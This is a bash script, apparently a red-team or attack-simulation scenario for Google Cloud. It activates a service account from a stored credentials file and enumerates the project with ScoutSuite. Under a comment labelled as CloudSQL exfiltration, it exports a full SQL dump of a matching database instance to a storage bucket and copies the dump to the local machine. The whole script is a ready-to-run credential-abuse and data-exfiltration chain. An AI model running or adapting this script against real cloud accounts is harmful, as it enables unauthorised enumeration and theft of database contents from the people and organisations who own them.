#!/bin/bash
SCRIPTNAME=gcpiam2cloudsql
LOGFILE=/tmp/$SCRIPTNAME.log
function log { 
    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" && echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE 
}
MAXLOG=2
for i in `seq $((MAXLOG-1)) -1 1`; do mv "$LOGFILE."{$i,$((i+1))} 2>/dev/null || true; done
mv $LOGFILE "$LOGFILE.1" 2>/dev/null || true
log "Downloading jq..."
if ! command -v jq; then curl -LJ -o /usr/bin/jq https://github.com/jqlang/jq/releases/download/jq-1.7/jq-linux-amd64 && chmod 755 /usr/bin/jq; fi
log "public ip: $(curl -s https://icanhazip.com)"

# gcp cred setup
export GOOGLE_APPLICATION_CREDENTIALS=~/.config/gcloud/credentials.json
gcloud auth activate-service-account --key-file ~/.config/gcloud/credentials.json | tee -a $LOGFILE
PROJECT=$(gcloud auth list --filter=status:ACTIVE --format="value(account)" | awk -F "@" '{ print $2 }' | sed 's/.iam.gserviceaccount.com//g')
USER=$(gcloud auth list --filter=status:ACTIVE --format="value(account)" | awk -F "@" '{ print $1 }')
DEPLOYMENT=$(echo ${USER##*-})

# cloud enumeration
scout gcp --service-account ~/.config/gcloud/credentials.json --report-dir /$SCRIPTNAME/scout-report --project-id=$PROJECT --no-browser 2>&1 | tee -a $LOGFILE 

# cloudsql exfil snapshot and export
SQL_INSTANCES=$(gcloud sql instances list --project=$PROJECT --format="json")
SQL_INSTANCE=$(echo $SQL_INSTANCES | jq -r --arg i $DEPLOYMENT '.[] | select(.name | endswith($i)) | .name')
SQL_DETAILS=$(gcloud sql instances describe $SQL_INSTANCE --project=$PROJECT --format="json")
SQL_PROJECT=$(echo $SQL_DETAILS | jq -r '.project')
SQL_REGION=$(echo $SQL_DETAILS | jq -r '.region')
gcloud config set project $SQL_PROJECT
gcloud config set compute/region $SQL_REGION
BUCKETS=$(gcloud storage buckets list --project=$SQL_PROJECT --format="json")
BUCKET_URL=$(echo $BUCKETS | jq -r --arg i $DEPLOYMENT '.[] | select(.name | contains($i)) | .storage_url')

gsutil ls -l $BUCKET_URL 2>&1 | tee -a $LOGFILE 
gcloud sql export sql --project=$SQL_PROJECT $SQL_INSTANCE "${BUCKET_URL}${SQL_INSTANCE}_dump.gz" 2>&1 | tee -a $LOGFILE 
gsutil cp ${BUCKET_URL}${SQL_INSTANCE}_dump.gz /$SCRIPTNAME 2>&1 | tee -a $LOGFILE 